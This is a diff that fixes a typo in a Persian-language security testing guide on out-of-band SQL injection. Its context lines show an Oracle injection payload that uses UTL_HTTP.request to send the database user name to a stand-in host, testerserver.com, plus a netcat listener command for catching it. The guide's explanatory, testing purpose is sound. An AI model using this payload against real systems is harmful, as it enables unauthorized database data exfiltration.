@@ -43,7 +43,7 @@ http://www.example.com/product.php?id=10
 ```sql
 http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80' || (SELECT user FROM DUAL)--
 ```
-در این مثال، تست نفوگر مقدار ۱۰ را با نتیجه تابع UTL_HTTP.requestبه هم متصل می‌کند. این تابع Oracle تلاش خواهد کرد تا به testerserver متصل شود و یک درخواست HTTP GET شامل بازگشت از کاربر SELECT پرس و جو از DAL ایجاد کند. تستر می‌تواند یک وب سرور (‏به عنوان مثال Apache)‏ایجاد کند یا از ابزار Netcat استفاده کند:
+در این مثال، تست نفوگر مقدار ۱۰ را با نتیجه تابع UTL_HTTP.requestبه هم متصل می‌کند. این تابع Oracle تلاش خواهد کرد تا به testerserver متصل شود و یک درخواست HTTP GET شامل بازگشت از کاربر SELECT پرس و جو از DUAL ایجاد کند. تستر می‌تواند یک وب سرور (‏به عنوان مثال Apache)‏ایجاد کند یا از ابزار Netcat استفاده کند:
 
 ```js
 /home/tester/nc -nLp 80
